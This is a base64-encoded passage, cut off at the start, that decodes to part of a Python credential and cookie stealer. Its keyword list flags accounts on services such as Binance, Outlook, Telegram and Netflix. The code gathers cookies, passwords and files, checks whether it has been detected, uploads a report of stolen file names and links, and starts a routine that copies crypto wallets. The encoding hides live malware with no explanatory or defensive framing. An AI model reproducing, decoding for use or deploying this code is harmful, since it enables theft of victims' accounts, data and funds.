0aW9uXShodHRwczovL3BsYXlzdGF0aW9uLmNvbSknLCAnW2hib10oaHR0cHM6Ly9oYm8uY29tKScsICdbeGJveF0oaHR0cHM6Ly94Ym94LmNvbSknLCAnYnV5JywgJ3NlbGwnLCAnW2JpbmFuY2VdKGh0dHBzOi8vYmluYW5jZS5jb20pJywgJ1tob3RtYWlsXShodHRwczovL2hvdG1haWwuY29tKScsICdbb3V0bG9va10oaHR0cHM6Ly9vdXRsb29rLmNvbSknLCAnW2NydW5jaHlyb2xsXShodHRwczovL2NydW5jaHlyb2xsLmNvbSknLCAnW3RlbGVncmFtXShodHRwczovL3RlbGVncmFtLmNvbSknLCAnW3Bvcm5odWJdKGh0dHBzOi8vcG9ybmh1Yi5jb20pJywgJ1tkaXNuZXldKGh0dHBzOi8vZGlzbmV5LmNvbSknLCAnW2V4cHJlc3N2cG5dKGh0dHBzOi8vZXhwcmVzc3Zwbi5jb20pJywgJ2NyeXB0bycsICdbdWJlcl0oaHR0cHM6Ly91YmVyLmNvbSknLCAnW25ldGZsaXhdKGh0dHBzOi8vbmV0ZmxpeC5jb20pJwpdCgoKY29va2lXb3JkcyA9IFtdCnBhc3dXb3JkcyA9IFtdCgpncmFiYl9HYXRoZXJBbGwoKQpERVRFQ1RFRCA9IFRydXN0KENvb2tpZXMpCgppZiBub3QgREVURUNURUQ6CiAgICB3aWtpdGggPSBiY19jaGVja2luZygpCgogICAgZm9yIHRocmVhZCBpbiB3aWtpdGg6IHRocmVhZC5qb2luKCkKICAgIHRpbWUuc2xlZXAoMC4yKQoKICAgIGZpbGV0ZXh0ID0gImBgYGRpZmZcbiIKICAgIGZvciBhcmcgaW4gYmNfY3JlYXRlX2ZpbGVzOgogICAgICAgIGlmIGxlbihhcmdbMl0pICE9IDA6CiAgICAgICAgICAgIGZvbGRwYXRoID0gYXJnWzFdCiAgICAgICAgICAgIGZvbGRsaXN0ID0gYXJnWzJdCiAgICAgICAgICAgIGZpbGV0ZXh0ICs9ZiJcbiIKICAgICAgICAgICAgZmlsZXRleHQgKz0gZiItIHtmb2xkcGF0aH1cbiIKCiAgICAgICAgICAgIGZvciBmZmlsIGluIGZvbGRsaXN0OgogICAgICAgICAgICAgICAgYSA9IGZmaWxbMF0uc3BsaXQoIi8iKQogICAgICAgICAgICAgICAgZmlsZWFubWUgPSBhW2xlbihhKS0xXQogICAgICAgICAgICAgICAgYiA9IGZmaWxbMV0KICAgICAgICAgICAgICAgIGZpbGV0ZXh0ICs9IGYiKyBOYW1lOiB7ZmlsZWFubWV9XG4rIExpbms6IHtifSIKICAgICAgICAgICAgICAgIGZpbGV0ZXh0ICs9ICJcbiIKICAgIGZpbGV0ZXh0ICs9ICJcbmBgYCIKCgogICAgdXBsb2FkKCJiY19jaGVja2luZyIsIGZpbGV0ZXh0KQogICAgYXV0byA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWF1dG9fY29weV93YWxsZXQoKS5ydW4pCiAgICBhdXRvLnN0YXJ0KCkK
